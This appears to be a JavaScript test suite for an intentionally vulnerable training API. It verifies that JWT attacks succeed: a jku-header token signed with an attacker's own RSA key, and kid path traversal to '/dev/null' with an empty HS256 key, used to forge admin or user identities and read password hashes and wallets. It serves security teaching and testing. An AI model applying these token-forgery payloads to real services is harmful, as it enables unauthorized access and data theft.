require('dotenv').config();
const assert = require('assert');
const crypto = require('crypto');
const http = require('http');
const jwt = require('jsonwebtoken');
const request = require('supertest')(require('./helpers/base-url'));

describe('JWT key handling labs', function () {
  let jwksServer;
  let jwksUrl;
  let privateKey;
  let publicJwk;

  before(function (done) {
    const pair = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    privateKey = pair.privateKey;
    publicJwk = { ...pair.publicKey.export({ format: 'jwk' }), kid: 'test-key', use: 'sig', alg: 'RS256' };
    jwksServer = http.createServer((req, res) => {
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ keys: [publicJwk] }));
    });

    // In Compose the app and test runner are separate containers on the same
    // network; in local runs both processes can reach the host loopback.
    const host = process.env.DVWS_BASE_URL?.includes('://web-test') ? '0.0.0.0' : '127.0.0.1';
    jwksServer.listen(0, host, () => {
      const address = jwksServer.address();
      const jwksHost = host === '0.0.0.0' ? 'test-runner' : '127.0.0.1';
      jwksUrl = `http://${jwksHost}:${address.port}/jwks`;
      done();
    });
  });

  after(function (done) {
    if (!jwksServer?.listening) return done();
    jwksServer.close(done);
  });

  it('accepts an attacker-signed RS256 token through shared auth and reaches a protected app route', async function () {
    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, privateKey, {
      algorithm: 'RS256',
      issuer: 'https://github.com/snoopysecurity',
      header: { jku: jwksUrl, kid: 'test-key' }
    });
    const response = await request.get('/api/v2/admin/logs')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
  });

  it('uses kid traversal to read actual user records through shared authentication', async function () {
    const username = `kid_user_${Date.now()}`;
    const created = await request.post('/api/v2/users').send({ username, password: 'Kid123!' });
    assert.strictEqual(created.status, 201);
    assert.strictEqual((await request.get('/api/v2/users')).status, 401);

    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, Buffer.from([0]), {
      algorithm: 'HS256',
      issuer: 'https://github.com/snoopysecurity',
      header: { kid: '../../../../../../dev/null' }
    });
    const response = await request.get('/api/v2/users')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual((await request.get('/api/v2/jwt-key-lab/kid/profile')
      .set('Authorization', `Bearer ${token}`)).status, 404);
    const exposed = response.body.result.find((user) => user.username === username);
    assert.ok(exposed);
    assert.match(exposed.password, /^\$2[aby]\$/);
    const wrongKeyToken = jwt.sign({ user: 'admin' }, Buffer.from([1]), {
      algorithm: 'HS256', issuer: 'https://github.com/snoopysecurity',
      header: { kid: '../../../../../../dev/null' }
    });
    assert.strictEqual((await request.get('/api/v2/users')
      .set('Authorization', `Bearer ${wrongKeyToken}`)).status, 401);
  });

  it('lets a forged identity read its Resource Store wallet and orders', async function () {
    const username = `kid_wallet_${Date.now()}`;
    assert.strictEqual((await request.post('/api/v2/users').send({ username, password: 'Kid123!' })).status, 201);
    const login = await request.post('/api/v2/login').send({ username, password: 'Kid123!' });
    assert.strictEqual(login.status, 200);
    const order = await request.post('/api/v2/resource-store/orders')
      .set('Authorization', `Bearer ${login.body.token}`)
      .send({ itemId: 'api-monitor', quantity: 1 });
    assert.strictEqual(order.status, 201);

    const token = jwt.sign({ user: username, permissions: ['user:read'] }, Buffer.from([0]), {
      algorithm: 'HS256',
      issuer: 'https://github.com/snoopysecurity',
      header: { kid: '../../../../../../dev/null' }
    });
    const response = await request.get('/api/v2/resource-store')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual(response.body.balance, 90);
    assert.strictEqual(response.body.orders[0]._id, order.body.order._id);
  });
});
